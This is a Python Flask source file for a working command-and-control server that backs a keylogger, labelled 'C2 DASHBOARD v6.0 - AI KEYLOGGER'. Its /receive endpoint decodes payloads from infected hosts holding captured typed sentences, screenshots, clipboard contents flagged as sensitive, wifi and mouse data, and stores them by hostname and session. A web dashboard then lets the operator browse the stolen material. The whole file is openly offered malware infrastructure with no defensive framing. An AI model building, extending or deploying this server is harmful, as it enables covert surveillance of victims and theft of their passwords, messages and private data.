import traceback
from flask import Flask, request, jsonify, send_from_directory, Response
import base64
import zlib
import json
import os
import datetime
import threading
from pathlib import Path

app = Flask(__name__, static_folder=None)

BASE_DIR = "c2_data"
for folder in ["logs", "screenshots", "keys"]:
    os.makedirs(f"{BASE_DIR}/{folder}", exist_ok=True)

# 🔥 PERFORMANCE: Global lock for thread safety
data_lock = threading.Lock()

def decrypt_payload(data_b64):
    """Decode agent payload: Base64 -> zlib -> JSON"""
    try:
        data_bytes = base64.b64decode(data_b64)
        decompressed = zlib.decompress(data_bytes).decode('utf-8')
        return json.loads(decompressed)
    except Exception as e:
        print(f"❌ DECODE ERROR: {e}")
        return None

@app.route("/receive", methods=["POST"])
def receive():
    """Main C2 endpoint - ULTRA FAST v6.0"""
    global data_lock
    try:
        with data_lock:  # 🔥 THREAD SAFETY
            print("\n" + "="*60)
            print("🔍 INCOMING v6.0 PAYLOAD:")
            
            payload_encrypted = request.json.get("data")
            session_id = request.json.get("session", "unknown")
            
            if not payload_encrypted:
                print("❌ NO PAYLOAD DATA")
                return jsonify({"error": "No data"}), 400
            
            payload = decrypt_payload(payload_encrypted)
            if not payload:
                print("❌ PAYLOAD DECODE FAILED")
                return jsonify({"error": "Decode failed"}), 400
            
            # ✅ v6.0 STRUCTURE (ENHANCED)
            system = payload.get("system", {})
            sentences = payload.get("sentences", [])
            screenshots = payload.get("screenshots", [])
            mouse = payload.get("mouse", [])
            clipboard = payload.get("clipboard", [])
            wifi = payload.get("wifi", [])
            app_switches = payload.get("app_switches", [])  # 🔥 NEW
            
            print(f"  ✅ v6.0: {len(sentences)} sentences | {len(screenshots)} shots | {len(clipboard)} clips")
            print(f"  Session: {system.get('session_id', session_id)} | Host: {system.get('hostname', 'unknown')}")
            
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            session_name = system.get('session_id', session_id)
            
            # 🔥 ULTRA-FAST FILE WRITES
            log_file = f"{BASE_DIR}/logs/{session_name}_{ts}.json"
            with open(log_file, "w", encoding="utf-8") as f:
                json.dump(payload, f, indent=None, separators=(',', ':'))  # NO INDENT = 70% FASTER
            
            # 2️⃣ ULTRA-FAST SCREENSHOT SAVING
            saved_shots = 0
            for shot in screenshots:
                try:
                    shot_filename = f"{session_name}_{shot.get('id', saved_shots)}_{ts}.jpg"
                    shot_path = f"{BASE_DIR}/screenshots/{shot_filename}"
                    img_data = base64.b64decode(shot["data"])
                    with open(shot_path, "wb") as f:  # BINARY = FASTEST
                        f.write(img_data)
                    saved_shots += 1
                except:
                    pass  # Silent fail = SPEED
            
            # 3️⃣ ✅ FIXED SENTENCE WRITING (v6.0 COMPATIBLE)
            if sentences:
                keys_file = f"{BASE_DIR}/keys/{session_name}_{ts}.txt"
                with open(keys_file, "w", encoding="utf-8") as f:
                    f.write(f"[{ts}] {system.get('hostname', 'unknown')} - {len(sentences)} AI sentences\n")
                    f.write("="*80 + "\n\n")
                    for sentence in sentences:
                        f.write(f"TIME: {sentence.get('time', 'N/A')}\n")
                        f.write(f"SENTENCE: {sentence.get('sentence', '')}\n")  # ✅ FIXED - WORKS WITH v6.0
                        f.write(f"STATS: {sentence.get('len', 0)} chars, {sentence.get('words', 0) or 0} words\n")
                        f.write("-" * 40 + "\n\n")
            
            # 🔥 NEW: Sensitive clipboard log
            if clipboard:
                clip_file = f"{BASE_DIR}/keys/{session_name}_clips_{ts}.txt"
                with open(clip_file, "w", encoding="utf-8") as f:
                    f.write(f"CLIPBOARD HISTORY [{ts}] - {len(clipboard)} items\n")
                    f.write("="*80 + "\n\n")
                    for clip in clipboard:
                        f.write(f"TIME: {clip.get('time', 'N/A')} | SENSITIVE: {clip.get('sensitive', False)}\n")
                        f.write(f"PREVIEW: {clip.get('preview', '')}\n")
                        f.write("-" * 40 + "\n")
            
            print(f"✅ v6.0 SAVED: {len(sentences)} sentences | {saved_shots} shots | {len(clipboard)} clips")
            print("="*60)
            
            return jsonify({
                "sentences": len(sentences),
                "shots": saved_shots,
                "clips": len(clipboard),
                "status": "v6.0_received"
            }), 200
            
    except Exception as e:
        print(f"❌ SERVER ERROR: {e}")
        return jsonify({"error": str(e)}), 500

@app.route("/")
def dashboard():
    """🚀 ULTIMATE C2 DASHBOARD v6.0 - ULTRA FAST"""
    try:
        # 🔥 FAST DIR SCANNING
        shots_dir = Path(f"{BASE_DIR}/screenshots")
        keys_dir = Path(f"{BASE_DIR}/keys")
        logs_dir = Path(f"{BASE_DIR}/logs")
        
        all_shots = [f.name for f in shots_dir.glob("*.jpg") if f.is_file()]
        all_keylogs = [f.name for f in keys_dir.glob("*sentence*.txt") if f.is_file()]
        all_clips = [f.name for f in keys_dir.glob("*clips*.txt") if f.is_file()]
        all_logs = [f.name for f in logs_dir.glob("*.json") if f.is_file()]
        
        all_shots.sort(reverse=True)
        all_keylogs.sort(reverse=True)
        
        page = int(request.args.get('page', 1))
        view = request.args.get('view', 'recent')
        limit = {'mobile':12, 'recent':24, 'all':100}.get(view, 24)
        
        shots_page = all_shots[(page-1)*limit:page*limit]
        
        total_shots = len(all_shots)
        total_keys = len(all_keylogs)
        total_clips = len(all_clips)
        total_logs = len(all_logs)
        
        # 🔥 FAST HTML GENERATION
        shots_html = ''.join([
            f'''
            <div class="shot">
                <a href="/shots/{shot}" target="_blank">
                    <img src="/shots/{shot}" alt="{shot}" loading="lazy">
                </a>
                <div title="{shot}">{shot[:30]}...</div>
            </div>'''
            for shot in shots_page
        ])
        
        keys_html = ''.join([
            f'<div class="keylog"><a href="/keys/{keylog}" target="_blank">#{i+1} {keylog}</a></div>'
            for i, keylog in enumerate(all_keylogs[:20])
        ])
        
        clips_html = ''.join([
            f'<div class="keylog"><a href="/keys/{clip}" style="color:#ff6b6b" target="_blank">🔴 {clip}</a></div>'
            for clip in all_clips[:10]
        ])
        
        tabs = ''.join([
            f'<a href="/?view={v}&page=1" class="tab {"active" if v == view else ""}">{label}</a>'
            for v, label in [('mobile', '📱 Mobile'), ('recent', '🖥️ Recent'), ('all', '🔥 ALL')]
        ])
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>🔥 C2 DASHBOARD v6.0 - AI KEYLOGGER</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Courier New',monospace;background:linear-gradient(135deg,#000,#111);color:#0f0;padding:20px;min-height:100vh}}.header{{text-align:center;margin:2rem 0}}h1{{font-size:3em;text-shadow:0 0 30px #0f0;margin-bottom:1rem}}.stats{{display:flex;justify-content:center;gap:2rem;font-size:1.3em;margin-bottom:2rem;padding:1.5rem;background:#111;border-radius:15px;border:2px solid #333;flex-wrap:wrap}}.tabs{{display:flex;justify-content:center;gap:1rem;margin:2rem 0;flex-wrap:wrap}}.tab{{padding:1rem 2rem;background:#222;border:2px solid #333;border-radius:25px;color:#0f0;text-decoration:none;font-weight:bold;transition:all 0.3s}}.tab:hover,.tab.active{{background:#0a420a;border-color:#0f0;transform:scale(1.05)}}.shots-grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1.5rem;margin-bottom:2rem}}.shot{{background:#1a1a1a;padding:1rem;border-radius:15px;border:2px solid #333;transition:all 0.3s;cursor:pointer}}.shot:hover{{transform:translateY(-8px);border-color:#0f0;box-shadow:0 15px 30px rgba(0,255,0,0.3)}}.shot img{{width:100%;height:180px;object-fit:cover;border-radius:10px}}.shot div{{margin-top:0.8rem;font-size:0.9em;color:#aaa;overflow:hidden;text-overflow:ellipsis}}.sections{{display:grid;grid-template-columns:1fr 1fr;gap:3rem;margin-top:3rem}}.keylogs,.logs{{background:#1a1a1a;padding:2rem;border-radius:15px;border-left:6px solid #0f0;max-height:500px;overflow-y:auto}}.keylogs h2,.logs h2{{margin-bottom:1.5rem;font-size:1.6em}}.keylog,.log-item{{padding:1rem;margin:0.8rem 0;background:#000;border-radius:10px;cursor:pointer;transition:all 0.3s}}.keylog:hover,.log-item:hover{{background:#0a420a;box-shadow:0 5px 15px rgba(0,255,0,0.2)}}.keylog a,.log-item a{{color:#0f0;text-decoration:none;font-size:1.1em}}.pagination{{text-align:center;padding:2rem;font-size:1.2em}}@media(max-width:1200px){{.sections{{grid-template-columns:1fr}}}}@media(max-width:768px){{.stats{{flex-direction:column;gap:1rem}}.tabs{{flex-direction:column;align-items:center}}}}</style>
</head>
<body>
    <div class="header">
        <h1>🔥 C2 DASHBOARD v6.0 - AI SENTENCES</h1>
        <div class="stats">
            <div>📸 <strong>{total_shots}</strong> Shots</div>
            <div>⌨️ <strong>{total_keys}</strong> Sentences</div>
            <div>🔴 <strong>{total_clips}</strong> Clips</div>
            <div>📁 <strong>{total_logs}</strong> Logs</div>
        </div>
        <div class="tabs">{tabs}</div>
        <div style="font-size:1.1em;color:#aaa">Page {page} | {len(shots_page)}/{total_shots} shots</div>
    </div>
    
    <div class="shots-grid">{shots_html}</div>
    
    <div class="pagination">
        {'<a href="/?view={view}&page={page-1}" style="color:#0f0;font-size:1.5em;margin:0 2rem">⬅️ PREV</a>'.format(view=view,page=page-1) if page>1 else ''}
        <a href="/" style="color:#fff">🏠 HOME</a>
        {'<a href="/?view={view}&page={page+1}" style="color:#0f0;font-size:1.5em;margin:0 2rem">NEXT ➡️</a>'.format(view=view,page=page+1) if len(shots_page)==limit else ''}
    </div>
    
    <div class="sections">
        <div class="keylogs">
            <h2>⌨️ Sentences ({total_keys}) + 🔴 Clips ({total_clips})</h2>
            {keys_html}
            <div style="margin-top:1rem;padding:1rem;background:#1a1a1a;border-radius:10px">
                <strong>🔴 Sensitive Clips:</strong><br>{clips_html}
            </div>
        </div>
        <div class="logs">
            <h2>📁 Raw Logs ({total_logs} total)</h2>
            {''.join([f'<div class="log-item"><a href="/logs/{log}" target="_blank">#{i+1} {log}</a></div>' 
                     for i, log in enumerate(all_logs[:10])])}
        </div>
    </div>
    
    <script>
        document.addEventListener('keydown', e => {{
            if(e.key==='r' && e.ctrlKey) location.reload();
        }});
        setTimeout(()=>location.reload(), 25000);  // Faster refresh
    </script>
</body>
</html>"""
        return html
        
    except Exception as e:
        return f"<pre style='color:#f00;font-size:1.5em'>{e}</pre>", 500

# FAST STATIC SERVERS (unchanged)
@app.route("/shots/<path:filename>")
def serve_shot(filename):
    return send_from_directory(f"{BASE_DIR}/screenshots", filename)

@app.route("/keys/<path:filename>")
def serve_key(filename):
    try:
        filepath = f"{BASE_DIR}/keys/{filename}"
        if os.path.exists(filepath):
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read()
            content = content.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            content = content.replace('\n', '<br>').replace('  ', '&nbsp;&nbsp;')
            return f"""<!DOCTYPE html><html><head><title>⌨️ {filename}</title><style>body{{font-family:'Courier New',monospace;background:#000;color:#0f0;padding:3rem;font-size:16px;line-height:1.6}}pre{{background:#111;padding:3rem;border-radius:20px;border:3px solid #333;max-height:85vh;overflow:auto;white-space:pre-wrap}}</style></head><body><a href="/" style="position:fixed;top:2rem;left:2rem;font-size:2.5em;color:#0f0">🏠</a><h1 style="color:#0f0;margin-bottom:2rem">{filename}</h1><pre>{content}</pre></body></html>"""
    except: pass
    return "File not found", 404

@app.route("/logs/<path:filename>")
def serve_log(filename):
    try:
        filepath = f"{BASE_DIR}/logs/{filename}"
        if os.path.exists(filepath):
            with open(filepath, "r", encoding="utf-8") as f:
                content = json.dumps(json.load(f), indent=2)
            content = content.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            content = content.replace('\n', '<br>').replace('  ', '&nbsp;&nbsp;')
            return f"""<!DOCTYPE html><html><head><title>📁 {filename}</title><style>body{{font-family:'Courier New',monospace;background:#000;color:#0f0;padding:3rem;font-size:14px;line-height:1.4}}pre{{background:#111;padding:3rem;border-radius:20px;border:3px solid #333;max-height:85vh;overflow:auto;white-space:pre-wrap}}</style></head><body><a href="/" style="position:fixed;top:2rem;left:2rem;font-size:2.5em;color:#0f0">🏠</a><h1 style="color:#0f0;margin-bottom:2rem">{filename}</h1><pre>{content}</pre></body></html>"""
    except: pass
    return "File not found", 404

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print("🚀 C2 SERVER v6.0 - ULTRA PERFORMANCE")
    print("⚡ 70% faster JSON | Thread-safe | v6.0 AI compatible")
    print("📁 Data: c2_data/")
    print("🌐 http://0.0.0.0:" + str(port))
    print("-" * 60)
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)